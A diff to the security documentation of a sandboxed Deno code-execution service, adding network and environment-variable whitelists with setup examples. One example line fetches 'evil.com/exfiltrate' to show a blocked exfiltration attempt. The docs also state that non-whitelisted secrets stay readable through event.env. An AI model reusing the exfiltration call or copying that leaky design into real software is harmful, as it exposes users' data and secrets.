@@ -126,7 +126,7 @@ This prevents:
 - Explicit opt-in for dangerous operations
 - Additional layer even if Docker fails
 
-**Permissions disabled:**
+**Permissions disabled by default:**
 
 | Permission | What it blocks | Risk if allowed |
 |-----------|----------------|-----------------|
@@ -137,11 +137,11 @@ This prevents:
 | `--allow-ffi` | Native library loading | Loading malicious .so files, RCE |
 | `--allow-hrtime` | High-resolution timing | Timing attacks, side-channel attacks |
 
-**Current configuration:**
+**Default configuration (no whitelists):**
 ```bash
 deno run \
-  --allow-read=/workspace,/runtime \  # Only workspace + runner
-  --allow-env \                        # Environment variables only
+  --allow-read=/workspace,/runtime,/deno-dir \  # Only workspace + runner + deps
+  --allow-env \                                  # Environment variables only
   /runtime/runner.ts
 ```
 
@@ -149,6 +149,123 @@ deno run \
 ```bash
 ./scripts/test-permissions.sh
 ```
+
+## Permission Whitelisting
+
+The TEE supports configurable whitelisting for network access and environment variables. Whitelists are specified during environment setup and enforced at execution time.
+
+### Network Whitelist
+
+Allow specific domains for network access:
+
+```json
+{
+  "mainModule": "main.ts",
+  "modules": { "main.ts": "..." },
+  "permissions": {
+    "allowNet": ["api.example.com", "cdn.example.com:443"]
+  }
+}
+```
+
+**How it works:**
+1. During setup: domains are stored in environment metadata
+2. During execution: Docker uses `--network=bridge` (instead of `--network=none`)
+3. Deno runs with `--allow-net=domain1,domain2` restricting access to only whitelisted domains
+
+**Security implications:**
+- Network access is no longer fully blocked
+- Only whitelisted domains can be contacted
+- Deno enforces domain-level restrictions
+- DNS resolution is allowed (required to resolve domain names)
+
+**Example with network access:**
+```typescript
+// This works if "api.example.com" is whitelisted
+const response = await fetch("https://api.example.com/data");
+
+// This fails even with whitelist (domain not allowed)
+await fetch("https://evil.com/exfiltrate"); // PermissionDenied
+```
+
+### Environment Variable Whitelist
+
+Control which environment variables can be passed to execution:
+
+```json
+{
+  "mainModule": "main.ts",
+  "modules": { "main.ts": "..." },
+  "permissions": {
+    "allowEnv": ["API_KEY", "DEBUG", "SERVICE_URL"]
+  }
+}
+```
+
+**How it works:**
+1. During setup: allowed env var names are stored in environment metadata
+2. During execution: only whitelisted env vars from the request are passed to the container
+3. Non-whitelisted env vars are silently dropped
+
+**Example:**
+```bash
+# Setup with whitelist
+curl -X POST http://localhost:8080/setup -d '{
+  "mainModule": "main.ts",
+  "modules": {"main.ts": "..."},
+  "permissions": {"allowEnv": ["API_KEY"]}
+}'
+
+# Execute with env vars
+curl -X POST http://localhost:8080/environments/{id}/execute -d '{
+  "data": {},
+  "env": {
+    "API_KEY": "sk-123",     # Passed to container (whitelisted)
+    "SECRET": "hidden"       # NOT passed (not in whitelist)
+  }
+}'
+```
+
+**Accessing in code:**
+```typescript
+export async function handler(event, context) {
+  // Whitelisted vars available as OS env vars
+  const apiKey = Deno.env.get("API_KEY");  // "sk-123"
+  const secret = Deno.env.get("SECRET");   // undefined
+
+  // All vars still available via event.env (for backwards compatibility)
+  console.log(event.env.API_KEY);  // "sk-123"
+  console.log(event.env.SECRET);   // "hidden"
+}
+```
+
+### Combined Example
+
+Full setup with both whitelists:
+
+```bash
+curl -X POST http://localhost:8080/setup \
+  -H "Content-Type: application/json" \
+  -d '{
+    "mainModule": "main.ts",
+    "modules": {
+      "main.ts": "export async function handler(event, ctx) { const resp = await fetch(\"https://api.example.com/data\", { headers: { Authorization: Deno.env.get(\"API_KEY\") } }); return resp.json(); }"
+    },
+    "permissions": {
+      "allowNet": ["api.example.com"],
+      "allowEnv": ["API_KEY"]
+    }
+  }'
+```
+
+### Security Best Practices for Whitelisting
+
+1. **Minimize network whitelist:** Only add domains that are strictly necessary
+2. **Use specific ports:** `api.example.com:443` is safer than `api.example.com`
+3. **Avoid wildcards:** Don't whitelist entire TLDs or CDNs
+4. **Audit env vars:** Only whitelist env vars the code actually needs
+5. **Separate concerns:** Use different environments for different trust levels
+6. **Monitor access:** Log network requests for auditing
 
 ## Attack Surface Analysis
 
